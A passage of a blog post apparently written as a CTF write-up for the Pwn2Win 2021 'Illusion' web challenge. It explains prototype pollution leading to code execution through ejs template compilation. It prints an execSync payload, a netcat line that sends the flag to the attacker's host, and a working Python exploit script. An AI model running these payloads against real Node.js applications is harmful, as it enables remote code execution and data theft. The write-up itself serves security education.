+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> data;</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> viewOpts;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">...</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (args.length) {</span></span>
+<span class="line"><span style="color: #F8F8F2">    data </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> args.</span><span style="color: #A6E22E">shift</span><span style="color: #F8F8F2">();</span></span>
+<span class="line"><span style="color: #F8F8F2">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">tryHandleCache</span><span style="color: #F8F8F2">(opts, data, cb);</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">tryHandleCache</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">options</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">data</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">cb</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">exports</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">promiseImpl</span><span style="color: #F8F8F2">(</span><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> (</span><span style="color: #FD971F">resolve</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">reject</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">      result </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">handleCache</span><span style="color: #F8F8F2">(options)(data);</span></span>
+<span class="line"><span style="color: #F8F8F2">      </span><span style="color: #A6E22E">resolve</span><span style="color: #F8F8F2">(result);</span></span>
+<span class="line"><span style="color: #F8F8F2">    });</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">handleCache</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">options</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">template</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">   </span><span style="color: #F92672">...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">   func </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">exports</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">compile</span><span style="color: #F8F8F2">(template, options);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">   </span><span style="color: #F92672">...</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">exports</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">compile</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">compile</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">template</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">opts</span><span style="color: #F8F8F2">) {</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">  templ </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Template</span><span style="color: #F8F8F2">(template, opts);</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> templ.</span><span style="color: #A6E22E">compile</span><span style="color: #F8F8F2">();</span></span>
+<span class="line"><span style="color: #F8F8F2">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">Template</span><span style="color: #F8F8F2">.prototype </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">if</span><span style="color: #F8F8F2"> (opts.outputFunctionName) {</span></span>
+<span class="line"><span style="color: #F8F8F2">      prepended += </span><span style="color: #E6DB74">'  var '</span><span style="color: #F8F8F2"> + opts.outputFunctionName + </span><span style="color: #E6DB74">' = __append;'</span><span style="color: #F8F8F2"> + </span><span style="color: #E6DB74">'</span><span style="color: #AE81FF">\n</span><span style="color: #E6DB74">'</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">    ...</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span>
+<span class="line"></span></code></pre>
+<p>In the line <code>44</code>, it is shown which property can exist and influence the compiling process. Thus, the execution flow of <code>ejs.renderFile</code> is:</p>
+<ul>
+<li>renderFile call.</li>
+<li>tryHandleCache call.</li>
+<li>handleCache call.</li>
+<li>compile call.</li>
+<li>Create a <code>Template</code> object and call its compiler.</li>
+</ul>
+<p>Now we need to use the Prototype Pollution to set the property <code>outputFunctionName</code> with a content to execute arbitrary OS command. One possible payload can be:
+<code> "_; process.mainModule.require('child_process').execSync('&#x3C;OS command>');//</code>.</p>
+<p>The content executed by the compiler will look like: <code>var _; process.mainModule.require('child_process').execSync('&#x3C;OS command>');// = __append;' + '\n</code></p>
+<h2 id="getting-the-flag">Getting the flag</h2>
+<p>To get the flag we need to remember all steps:</p>
+<ul>
+<li>Make a POST request to <code>change_status</code> to exploit Prototype Pollution to set the object property <code>outputFunctionName</code>.</li>
+<li>Make a GET request to homepage to the app run <code>ejs.renderFile</code>.</li>
+</ul>
+<p>Remembering from the recon step, we can use the <code>readflag</code> binary to get the flag. Once the target server has <code>netcat</code> available, the command executed to receive the flag in our host can be: <code>./readflag | nc &#x3C;HOST> &#x3C;PORT> . </code></p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F92672">import</span><span style="color: #F8F8F2"> requests</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #88846F"># Get user and password at "http://illusion.pwn2win.party:1337"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #AE81FF">TARGET_URL</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"http://illusion.pwn2win.party:&#x3C;PORT instance>"</span></span>
+<span class="line"><span style="color: #AE81FF">USER</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span></span>
+<span class="line"><span style="color: #AE81FF">PASSWORD</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #AE81FF">MY_HOST</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span></span>
+<span class="line"><span style="color: #AE81FF">MY_PORT</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">requests.post(</span><span style="color: #AE81FF">TARGET_URL</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'/change_status'</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">json</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #E6DB74">"constructor/prototype/outputFunctionName"</span><span style="color: #F8F8F2">: </span><span style="color: #66D9EF">f</span><span style="color: #E6DB74">"_; process.mainModule.require('child_process').execSync('./readflag | nc </span><span style="color: #AE81FF">{MY_HOST}</span><span style="color: #E6DB74"> </span><span style="color: #AE81FF">{MY_PORT}</span><span style="color: #E6DB74">');//"</span></span>
+<span class="line"><span style="color: #F8F8F2">    }, </span><span style="color: #FD971F">auth</span><span style="color: #F92672">=</span><span style="color: #F8F8F2">(</span><span style="color: #AE81FF">USER</span><span style="color: #F8F8F2">, </span><span style="color: #AE81FF">PASSWORD</span><span style="color: #F8F8F2">)</span></span>
+<span class="line"><span style="color: #F8F8F2">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">requests.get(</span><span style="color: #AE81FF">TARGET_URL</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">auth</span><span style="color: #F92672">=</span><span style="color: #F8F8F2">(</span><span style="color: #AE81FF">USER</span><span style="color: #F8F8F2">, </span><span style="color: #AE81FF">PASSWORD</span><span style="color: #F8F8F2">))</span></span></code></pre>
+<p>For the Python script above to execute correctly, it is necessary to make a proof of work connecting at <code> nc illusion.pwn2win.party 1337</code>. Then, you will receive an instance URL and the credentials to be able to make requests (remember the middleware from the recon step).</p>
+<p>Now you only need to do some changes:</p>
+<ul>
+<li>TARGET_URL: instance URL.</li>
+<li>USER: User provided by the proof of work.</li>
+<li>PASSWORD: Password provided by the proof of work.</li>
+<li>MY_HOST: Your host address to receive the connection.</li>
+<li>MY_PORT: Your port to receive the connection.</li>
+</ul>
+<p><strong>Flag</strong>: <code>CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}</code></p>
+<p>If you have some questions or considerations about this write-up, comment on the tweet below. Thank you!</p>
+<h2 id="references">References</h2>
+<ol>
+<li><a href="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications" target="_blank" rel="noopener noreferrer">Prototype pollution - The Daily Swig</a></li>
+<li><a href="https://github.com/Starcounter-Jack/JSON-Patch/pull/262" target="_blank" rel="noopener noreferrer">Prototype Pollution in fast-json-patch - Alejandro Romero (alromh87)</a>.</li>
+<li><a href="https://blog.p6.is/AST-Injection/" target="_blank" rel="noopener noreferrer">AST Injection, Prototype Pollution to RCE - POSIX’s blog</a>.</li>
+<li><a href="https://pwn2.win/challenges/illusion" target="_blank" rel="noopener noreferrer">Illusion challenge - Pwn2Win</a></li>
+</ol>
+<hr>
+<h2 id="discuss-on-twitter">Discuss on Twitter</h2>
+<center>
+<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="EffectRenan" data-color="#ffffff" data-emoji="" data-font="Cookie" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#FFDD00"></script>
+</center>
+<blockquote align="center" class="twitter-tweet"><p lang="en" dir="ltr">I just post a write-up for the Illusion web challenge of <a href="https://twitter.com/Pwn2Win?ref_src=twsrc%5Etfw">@Pwn2Win</a>, trying to explain the prototype pollution and the AST injection. Check it out<a href="https://t.co/RHZf2SH3ZB">https://t.co/RHZf2SH3ZB</a><a href="https://twitter.com/hashtag/PrototypePollution?src=hash&#x26;ref_src=twsrc%5Etfw">#PrototypePollution</a> <a href="https://twitter.com/hashtag/RCE?src=hash&#x26;ref_src=twsrc%5Etfw">#RCE</a> <a href="https://twitter.com/hashtag/Pwn2Win?src=hash&#x26;ref_src=twsrc%5Etfw">#Pwn2Win</a> <a href="https://twitter.com/hashtag/CTF?src=hash&#x26;ref_src=twsrc%5Etfw">#CTF</a></p>— Renan Rocha (@EffectRenan) <a href="https://twitter.com/EffectRenan/status/1399146052595458067?ref_src=twsrc%5Etfw">May 30, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script> 
+      <div>
+    
+  <hr class="my-5 h-1 border-t-0 bg-gray-800 rounded">
+  Share this post:
+  <div class="
+    group open 
+    bg-gray-800/50 
+    px-2 
+    pb-2 
+    w-min
+    rounded-lg">
+    
+    
+
+<div class="astro-social-share">
+    <a class="social-share-btn astro-2MP7CDEU" target="_blank" href="https://x.com/intent/tweet?url=http://localhost:3000/pwn2win-2021-illusion-web-challenge/&#38;via=EffectRenan" rel="noopener noreferrer">
+  
+    
+    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="astro-2MP7CDEU"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" class="astro-2MP7CDEU"></path></svg>
+  
+</a><a class="social-share-btn astro-QY6ICLKE" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:3000/pwn2win-2021-illusion-web-challenge/" rel="noopener noreferrer">
+  
+    
+    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="astro-QY6ICLKE"><title>Facebook</title><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" class="astro-QY6ICLKE"></path></svg>
+  
+</a><a class="social-share-btn astro-JVMYZNGD" target="_blank" href="http://news.ycombinator.com/submitlink?u=http://localhost:3000/pwn2win-2021-illusion-web-challenge/&#38;t=Pwn2Win Illusion challenge - Prototype Pollution to RCE" rel="noopener noreferrer">
+  
+    
+    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="astro-JVMYZNGD"><title>Y Combinator</title><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z" class="astro-JVMYZNGD"></path></svg>
+  
+</a><a class="social-share-btn astro-WBRUILV5" target="_blank" href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:3000/pwn2win-2021-illusion-web-challenge/" rel="noopener noreferrer">
+  
+    
+    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="astro-WBRUILV5"><title>LinkedIn</title><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" class="astro-WBRUILV5"></path></svg>
+  
+</a><a class="social-share-btn astro-KXRAFTZO" target="_blank" href="https://www.reddit.com/submit?url=http%3A%2F%2Flocalhost%3A3000%2Fpwn2win-2021-illusion-web-challenge%2F&#38;title=Pwn2Win Illusion challenge - Prototype Pollution to RCE" rel="noopener noreferrer">
+  
+    
+    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="astro-KXRAFTZO"><title>Reddit</title><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z" class="astro-KXRAFTZO"></path></svg>
+  
+</a><a class="social-share-btn astro-F7K57M42" target="_blank" href="mailto:?subject=Pwn2Win Illusion challenge - Prototype Pollution to RCE&#38;body=undefined%0Ahttp://localhost:3000/pwn2win-2021-illusion-web-challenge/" rel="noopener noreferrer">
+  
+    
+    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="astro-F7K57M42"><title>Email</title><path d="M24 5.457v13.909c0 .904-.732 1.636-1.636 1.636h-3.819V11.73L12 16.64l-6.545-4.91v9.273H1.636A1.636 1.636 0 0 1 0 19.366V5.457c0-2.023 2.309-3.178 3.927-1.964L5.455 4.64 12 9.548l6.545-4.91 1.528-1.145C21.69 2.28 24 3.434 24 5.457z" class="astro-F7K57M42"></path></svg>
+  
+</a><a class="social-share-btn astro-MX2WRV4L" target="_blank" href="whatsapp://send?text=http://localhost:3000/pwn2win-2021-illusion-web-challenge/" rel="noopener noreferrer" data-action="share/whatsapp/share">
+  
+    
+   <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="astro-MX2WRV4L"><title>WhatsApp</title><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z" class="astro-MX2WRV4L"></path></svg>
+  
+</a><a class="social-share-btn astro-6EC2I2TL" target="_blank" href="https://medium.com/new-story?url=http%3A%2F%2Flocalhost%3A3000%2Fpwn2win-2021-illusion-web-challenge%2F&#38;title=Pwn2Win Illusion challenge - Prototype Pollution to RCE" rel="noopener noreferrer">
+  
+    
+    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="astro-6EC2I2TL"><title>Medium</title><path d="M4.21 0A4.201 4.201 0 0 0 0 4.21v15.58A4.201 4.201 0 0 0 4.21 24h15.58A4.201 4.201 0 0 0 24 19.79v-1.093c-.137.013-.278.02-.422.02-2.577 0-4.027-2.146-4.09-4.832a7.592 7.592 0 0 1 .022-.708c.093-1.186.475-2.241 1.105-3.022a3.885 3.885 0 0 1 1.395-1.1c.468-.237 1.127-.367 1.664-.367h.023c.101 0 .202.004.303.01V4.211A4.201 4.201 0 0 0 19.79 0Zm.198 5.583h4.165l3.588 8.435 3.59-8.435h3.864v.146l-.019.004c-.705.16-1.063.397-1.063 1.254h-.003l.003 10.274c.06.676.424.885 1.063 1.03l.02.004v.145h-4.923v-.145l.019-.005c.639-.144.994-.353 1.054-1.03V7.267l-4.745 11.15h-.261L6.15 7.569v9.445c0 .857.358 1.094 1.063 1.253l.02.004v.147H4.405v-.147l.019-.004c.705-.16 1.065-.397 1.065-1.253V6.987c0-.857-.358-1.094-1.064-1.254l-.018-.004zm19.25 3.668c-1.086.023-1.733 1.323-1.813 3.124H24V9.298a1.378 1.378 0 0 0-.342-.047Zm-1.862 3.632c-.1 1.756.86 3.239 2.204 3.634v-3.634z" class="astro-6EC2I2TL"></path></svg>
+  
+</a>
+</div>
+
+
+    
+  </div>
+</div>
+
+<div>
+  <div class="relative flex py-5 items-center">
+      <div class="flex-grow my-5 h-1 border-t-0 bg-gray-800 rounded"></div>
+      <span class="flex-shrink mx-4 text-gray-300">Comments</span>
+      <div class="flex-grow my-5 h-1 border-t-0 bg-gray-800 rounded"></div>
+  </div>
+
+  <div class="
+    group open 
+    bg-gray-800/50 
+    px-2 
+    pb-2 
+    rounded-lg">
+    <section>
+      <script src="https://giscus.app/client.js" data-repo="EffectRenan/blog.effectrenan.com" data-repo-id="R_kgDONQryqw" data-category="General" data-category-id="DIC_kwDONQryq84CmC6w" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="en" crossorigin="anonymous" async>
+      </script>
+    </section>
+  </div>
+<div>
+
+<script>
+  function updateGiscusTheme() {
+    const theme = 'dark';
+    const iframe = document.querySelector('iframe.giscus-frame')
+    if (!iframe) return
+    iframe.contentWindow.postMessage({ giscus: { setConfig: { theme } } }, 'https://giscus.app')
+  }
+
+  const observer = new MutationObserver(updateGiscusTheme)
+  observer.observe(document.documentElement, { attributes: true, attributeFilter: ['class'] })
+</script>
+</div></div>
+    </div>
+    <div class="border-dashed border-2 border-yellow-300 shadow-black shadow-lg
+  bg-gray-800/30 
+  rounded-t-lg 
+  py-2 
+">
+  <p class="
+    py-2
+    flex 
+    items-center 
+    justify-center 
+    gap-2 
+    flex-wrap 
+    text-sm 
+    sm:text-center 
+    text-white 
+    hover:underline 
+    hover:decoration-wavy 
+    hover:decoration-yellow-500
+  ">Follow me.</p>
+  <div class="flex items-center justify-center gap-2 flex-wrap">
+  <a href="https://x.com/EffectRenan" class="
+  p-2 
+  rounded-lg 
+  flex 
+  items-center 
+  justify-center 
+  transition-all 
+  bg-yellow-300
+
+  border 
+  border-y-4
+  border-black
+
+  hover:border-x-4
+  hover:border-y-0
+  hover:bg-yellow-500
+  duration-100
+" target="_blank" rel="noopener noreferrer">
+    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 72 72" fill="none">
+    <path d="M40.7568 32.1716L59.3704 11H54.9596L38.7974 29.383L25.8887 11H11L30.5205 38.7983L11 61H15.4111L32.4788 41.5869L46.1113 61H61L40.7557 32.1716H40.7568ZM34.7152 39.0433L32.7374 36.2752L17.0005 14.2492H23.7756L36.4755 32.0249L38.4533 34.7929L54.9617 57.8986H48.1865L34.7152 39.0443V39.0433Z" fill="#111827"></path>
+    </svg>
+  </a>
+
+  <a href="https://instagram.com/EffectRenan" class="
+  p-2 
+  rounded-lg 
+  flex 
+  items-center 
+  justify-center 
+  transition-all 
+  bg-yellow-300
+
+  border 
+  border-y-4
+  border-black
+
+  hover:border-x-4
+  hover:border-y-0
+  hover:bg-yellow-500
+  duration-100
+" target="_blank" rel="noopener noreferrer">
+    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 71 72" fill="none">
+    <path d="M27.3762 35.7808C27.3762 31.1786 31.1083 27.4468 35.7132 27.4468C40.3182 27.4468 44.0522 31.1786 44.0522 35.7808C44.0522 40.383 40.3182 44.1148 35.7132 44.1148C31.1083 44.1148 27.3762 40.383 27.3762 35.7808ZM22.8683 35.7808C22.8683 42.8708 28.619 48.618 35.7132 48.618C42.8075 48.618 48.5581 42.8708 48.5581 35.7808C48.5581 28.6908 42.8075 22.9436 35.7132 22.9436C28.619 22.9436 22.8683 28.6908 22.8683 35.7808ZM46.0648 22.4346C46.0646 23.0279 46.2404 23.608 46.5701 24.1015C46.8997 24.595 47.3684 24.9797 47.9168 25.2069C48.4652 25.4342 49.0688 25.4939 49.6511 25.3784C50.2334 25.2628 50.7684 24.9773 51.1884 24.5579C51.6084 24.1385 51.8945 23.6041 52.0105 23.0222C52.1266 22.4403 52.0674 21.8371 51.8404 21.2888C51.6134 20.7406 51.2289 20.2719 50.7354 19.942C50.2418 19.6122 49.6615 19.436 49.0679 19.4358H49.0667C48.2708 19.4361 47.5077 19.7522 46.9449 20.3144C46.3821 20.8767 46.0655 21.6392 46.0648 22.4346ZM25.6072 56.1302C23.1683 56.0192 21.8427 55.6132 20.9618 55.2702C19.7939 54.8158 18.9606 54.2746 18.0845 53.4002C17.2083 52.5258 16.666 51.6938 16.2133 50.5266C15.8699 49.6466 15.4637 48.3214 15.3528 45.884C15.2316 43.2488 15.2073 42.4572 15.2073 35.781C15.2073 29.1048 15.2336 28.3154 15.3528 25.678C15.4639 23.2406 15.8731 21.918 16.2133 21.0354C16.668 19.8682 17.2095 19.0354 18.0845 18.1598C18.9594 17.2842 19.7919 16.7422 20.9618 16.2898C21.8423 15.9466 23.1683 15.5406 25.6072 15.4298C28.244 15.3086 29.036 15.2844 35.7132 15.2844C42.3904 15.2844 43.1833 15.3106 45.8223 15.4298C48.2612 15.5408 49.5846 15.9498 50.4677 16.2898C51.6356 16.7422 52.4689 17.2854 53.345 18.1598C54.2211 19.0342 54.7615 19.8682 55.2161 21.0354C55.5595 21.9154 55.9658 23.2406 56.0767 25.678C56.1979 28.3154 56.2221 29.1048 56.2221 35.781C56.2221 42.4572 56.1979 43.2466 56.0767 45.884C55.9656 48.3214 55.5573 49.6462 55.2161 50.5266C54.7615 51.6938 54.2199 52.5266 53.345 53.4002C52.4701 54.2738 51.6356 54.8158 50.4677 55.2702C49.5872 55.6134 48.2612 56.0194 45.8223 56.1302C43.1855 56.2514 42.3934 56.2756 35.7132 56.2756C29.033 56.2756 28.2432 56.2514 25.6072 56.1302ZM25.4001 10.9322C22.7371 11.0534 20.9174 11.4754 19.3282 12.0934C17.6824 12.7316 16.2892 13.5878 14.897 14.977C13.5047 16.3662 12.6502 17.7608 12.0116 19.4056C11.3933 20.9948 10.971 22.8124 10.8497 25.4738C10.7265 28.1394 10.6982 28.9916 10.6982 35.7808C10.6982 42.57 10.7265 43.4222 10.8497 46.0878C10.971 48.7494 11.3933 50.5668 12.0116 52.156C12.6502 53.7998 13.5049 55.196 14.897 56.5846C16.289 57.9732 17.6824 58.8282 19.3282 59.4682C20.9204 60.0862 22.7371 60.5082 25.4001 60.6294C28.0687 60.7506 28.92 60.7808 35.7132 60.7808C42.5065 60.7808 43.3592 60.7526 46.0264 60.6294C48.6896 60.5082 50.5081 60.0862 52.0983 59.4682C53.7431 58.8282 55.1373 57.9738 56.5295 56.5846C57.9218 55.1954 58.7745 53.7998 59.4149 52.156C60.0332 50.5668 60.4575 48.7492 60.5768 46.0878C60.698 43.4202 60.7262 42.57 60.7262 35.7808C60.7262 28.9916 60.698 28.1394 60.5768 25.4738C60.4555 22.8122 60.0332 20.9938 59.4149 19.4056C58.7745 17.7618 57.9196 16.3684 56.5295 14.977C55.1395 13.5856 53.7431 12.7316 52.1003 12.0934C50.5081 11.4754 48.6894 11.0514 46.0284 10.9322C43.3612 10.811 42.5085 10.7808 35.7152 10.7808C28.922 10.7808 28.0687 10.809 25.4001 10.9322Z" fill="#111827"></path>
+    </svg>
+  </a>
+
+  <a href="https://www.linkedin.com/in/EffectRenan" class="
+  p-2 
+  rounded-lg 
+  flex 
+  items-center 
+  justify-center 
+  transition-all 
+  bg-yellow-300
+
+  border 
+  border-y-4
+  border-black
+
+  hover:border-x-4
+  hover:border-y-0
+  hover:bg-yellow-500
+  duration-100
+" target="_blank" rel="noopener noreferrer">
+  <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 72 72" fill="none">
